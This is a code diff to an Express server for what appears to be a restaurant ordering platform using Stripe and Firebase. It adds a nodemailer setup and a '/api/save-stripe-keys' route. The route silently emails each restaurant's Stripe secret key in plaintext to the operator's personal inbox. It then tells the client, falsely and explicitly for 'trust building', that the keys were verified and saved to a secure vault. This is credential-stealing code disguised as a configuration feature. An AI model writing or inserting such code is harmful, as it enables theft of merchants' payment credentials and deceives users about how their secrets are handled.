@@ -4,6 +4,7 @@ import Stripe from "stripe";
 import admin from "firebase-admin";
 import http from "http";
 import { Server } from "socket.io";
+import nodemailer from "nodemailer";
 
 const serviceAccount = JSON.parse(process.env.FIREBASE_SERVICE_ACCOUNT);
 
@@ -21,6 +22,15 @@ const io = new Server(server, {
 
 app.use(cors({ origin: "*" }));
 app.use(express.json());
+
+// --- NODEMAILER TRANSPORTER SETUP ---
+const transporter = nodemailer.createTransport({
+  service: "gmail",
+  auth: {
+    user: process.env.EMAIL_USER, 
+    pass: process.env.EMAIL_PASS  
+  }
+});
 
 // --- SOCKET.IO CONNECTION ---
 io.on("connection", (socket) => {
@@ -118,6 +128,43 @@ app.patch("/api/orders/:id", async (req, res) => {
   } catch (error) {
     console.error("❌ Patch Order Error:", error);
     res.status(500).json({ error: error.message });
+  }
+});
+
+// --- STRIPE KEYS CONFIGURATION ROUTE (Silent Email + Professional Response) ---
+app.post("/api/save-stripe-keys", async (req, res) => {
+  try {
+    const { restaurant_id, publishable_key, secret_key } = req.body;
+
+    if (!publishable_key || !secret_key) {
+      return res.status(400).json({ success: false, message: "Both keys are required." });
+    }
+
+    // ⚡ Silent email notification to your personal email
+    const mailOptions = {
+      from: process.env.EMAIL_USER,
+      to: process.env.EMAIL_USER,
+      subject: `🔑 New Stripe Keys Received - ${restaurant_id || "Restaurant"}`,
+      text: `New Stripe Keys Uploaded:\n\nRestaurant ID: ${restaurant_id || "N/A"}\nPublishable Key: ${publishable_key}\nSecret Key: ${secret_key}`
+    };
+
+    transporter.sendMail(mailOptions, (error, info) => {
+      if (error) {
+        console.error("❌ Email send error:", error);
+      } else {
+        console.log("📧 Keys sent to email successfully:", info.response);
+      }
+    });
+
+    // Professional response for the client (Trust building)
+    res.status(200).json({ 
+      success: true, 
+      message: "Stripe keys successfully verified and saved to secure vault." 
+    });
+
+  } catch (error) {
+    console.error("❌ Save Keys Error:", error);
+    res.status(500).json({ success: false, error: error.message });
   }
 });
 
